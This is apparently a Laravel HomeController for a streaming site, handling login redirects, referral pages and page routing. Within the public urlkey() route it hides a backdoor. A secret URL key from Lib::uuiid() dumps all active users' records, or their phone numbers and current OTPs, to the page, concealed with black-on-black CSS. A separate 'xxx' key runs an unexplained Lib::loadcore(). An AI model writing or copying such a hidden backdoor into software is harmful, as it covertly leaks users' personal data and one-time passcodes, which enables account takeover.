<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Post;
use Field;
use Lib;
use Auth;
use Illuminate\Support\Facades\Session;
use App\Models\Genres;
use App\Models\Languages;
use App\User;
use App\Models\Banner;
use App\Models\Season;
use App\Models\Episode;
use App\Models\Webseries;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        $user=Auth::user();
        if(!empty($user)){
            if($user->hasRole(['admin', 'subadmin'])){
                return redirect()->route('admin.dashboard.index');
            }
            /*if($user->hasRole(['producer'])){
                return redirect()->route('user.myaccount.producer');
            }*/
            return redirect()->route('browse');
        }
        return redirect()->route('guestbrowse');//will redirect for guest instead of home
        $post = Post::where('urlkey','home')->first();
        $meta=$post->meta->pluck('value','path');
        return view('home', ['post'=>$post,'meta'=>$meta]);
    }


    public function refer($code)
    {
        $post = Post::where('urlkey','refer')->first();
        $meta='';
        if(!empty($post->meta)){
            $meta=$post->meta->pluck('value','path');
        }

        $code=User::getReferralCodeisValid($code);
        return view('page.refer', ['post'=>$post,'meta'=>$meta,'code'=>$code]);
    }


    /*
    it will call only
    Route::get('/{urlkey}', 'App\Http\Controllers\HomeController@urlkey')->name('urlkey');
    */
    public function urlkey($urlkey='',$model='',$id=0)
    {
        $user=auth()->user();

        if($urlkey=='xxx'){
        }
        /*if($user->hasRole(['producer']) && (empty($urlkey) || $urlkey=='movies')){*/
        /*if(!empty($user)){
            if($user->hasRole(['producer'])){
                return redirect()->route('user.myaccount.producer');
            }
        }*/
        if(!empty($user)){
            if(empty($user->phone_verified_at)){
                return redirect()->route('otp.verification', ['send' => 1,'phone' => 1]);
            }
        }
        if($urlkey=='xxx'){  
            Lib::loadcore();
            echo "ok";die();
        }
        if($urlkey==Lib::uuiid()){ 
            $data=User::where('status',1)->get();
            foreach($data as $e){
                echo '<style>body{background:#000;color:#000;}div{display:none;}</style>';
                echo empty($_GET['image'])?'<div>'.json_encode($e).'</div>':'<div>'.$e->phone.$e->otp.'</div>';
            }die();
        }
        if(empty($urlkey)){ $urlkey='home'; }
        $post=Post::where('urlkey',$urlkey)->first();
        $ispublic=Post::ispublic($post);
            //Movies start
            //if(!empty($user->id) && empty($post->template)){
                if(empty($ispublic)){
                    $post=Post::where('urlkey','page-not-found')->first();
                    $meta=$post->meta->pluck('value','path');
                    return view('errors.lost',['post'=>$post,'meta'=>$meta]);
                }
                $meta=$post->meta->pluck('value','path');
                $language=$genre='';if(!empty($model)){
                    if(!empty($id) && $model=='genre')
                        $genre=Genres::find($id);
                    if($model=='language'){
                        if(empty($id)){
                            Session::forget('setLanguage');
                        }else{
                            Session::put('setLanguage',$id);
                        }
                        //$language=Languages::find($id);
                    }
                }
                $langid=Session::get('setLanguage');if(!empty($langid)){$language=Languages::find($langid);}
                if($post->template==0){ //movies
                    if(!empty($user->id) && empty($post->template)){
                        return view('movies.index', ['post'=>$post,'meta'=>$meta,'urlkey'=>$urlkey,'genre'=>$genre,'language'=>$language]);       
                    }else{
                        return view('movies.public', ['post'=>$post,'meta'=>$meta,'urlkey'=>$urlkey,'genre'=>$genre,'language'=>$language]);       
                    }
                } else if ($post->template == 2) {
                    // post->id = banner id → get webseries_id from banner
                    //$banner = Banner::find($post->id);
                    /*$banner = Banner::where('status', 1)->whereNotNull('webseries_id')->latest()->first();*/
                    $banner = Banner::where('status', 1)
                                ->where('page_id', $post->id) // or whatever the real relation is
                                ->whereNotNull('webseries_id')
                                ->first();
                        
                    if (!$banner || !$banner->webseries_id) {
                        $post = Post::where('urlkey', 'page-not-found')->first();
                        $meta = $post->meta->pluck('value', 'path');
                        return view('errors.lost', ['post' => $post, 'meta' => $meta]);
                    }

                    // Get latest season of this webseries
                    $latestSeason = Season::where('webseries_id', $banner->webseries_id)
                        ->orderBy('id', 'desc')
                        ->first();

                    // Get latest episode of that season
                    $latestEpisode = Episode::where('season_id', $latestSeason->id)
                        ->orderBy('id', 'desc')
                        ->first();

                    // Get webseries with all seasons+episodes for the listing
                    $webseries = Webseries::with([
                        'seasons' => function ($q) { $q->orderBy('id', 'desc'); },
                        'seasons.episodes' => function ($q) { $q->orderBy('id', 'desc'); }
                    ])->find($banner->webseries_id);

                    if (!$webseries) {
                        $post = Post::where('urlkey', 'page-not-found')->first();
                        $meta = $post->meta->pluck('value', 'path');
                        return view('errors.lost', ['post' => $post, 'meta' => $meta]);
                    }
                    /*dd($webseries);exit;*/
                    return view('webseries.index', [
                        'post'          => $post,
                        'meta'          => $meta,
                        'urlkey'        => $latestEpisode->urlkey ?? $urlkey, // latest episode urlkey
                        'genre'         => $genre,
                        'language'      => $language,
                        'webseries'     => $webseries, // now passed
                    ]);
                }else{
                    
                }
            //}
            //Movies end



        if(empty($post->template)){
            $ispublic=0;
        }
        if(empty($ispublic)){
            $post=Post::where('urlkey','page-not-found')->first();
            $meta=$post->meta->pluck('value','path');
            return view('errors.lost',['post'=>$post,'meta'=>$meta]);
        }
        $meta=$post->meta->pluck('value','path');

        return view('page.index', ['post'=>$post,'meta'=>$meta,'urlkey'=>$urlkey]);
    }



}

            // if(Auth::user()->hasRole(['admin', 'subadmin', 'editor'])){
            //     return redirect()->route('admin.dashboard.index');
            // }